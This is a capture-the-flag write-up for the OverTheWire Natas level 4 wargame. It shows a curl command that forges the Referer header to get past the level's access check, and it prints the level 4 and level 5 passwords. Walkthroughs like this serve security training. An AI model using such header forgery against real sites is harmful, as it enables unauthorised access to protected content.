## Recap

* You'll get the password in level3. it's `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

## Problem 

Username: natas4
URL:      http://natas4.natas.labs.overthewire.org

![image-20201001205305761](https://i.imgur.com/9SWC8Go.png)

## Solution

* In other words, the problem4 needs you change your referer to natas5. The following image is natas4's request header.

![image-20201001205657804](https://i.imgur.com/6IFz2VA.png)

* Now, we copy curl command. Only if we change the request header website will give us token or secret.

![image-20201001205745038](https://i.imgur.com/PeEI8Y1.png)

* And command copied as followed, we change referer and resend in cmd or bash. (I use bash.)

```cmd
curl 'http://natas4.natas.labs.overthewire.org/index.php' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: http://natas5.natas.labs.overthewire.org/' \
  -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,ja;q=0.5' \
  -H 'Cookie: __utmz=176859643.1584093642.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmc=176859643; __utma=176859643.1553443093.1584093642.1601477126.1601556715.10; __utmt=1; __utmb=176859643.2.10.1601556715' \
  --compressed \
  --insecure
```

* After doing so, you'll get the token.

![image-20201001210119071](https://i.imgur.com/rJk4Sch.png)

`Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`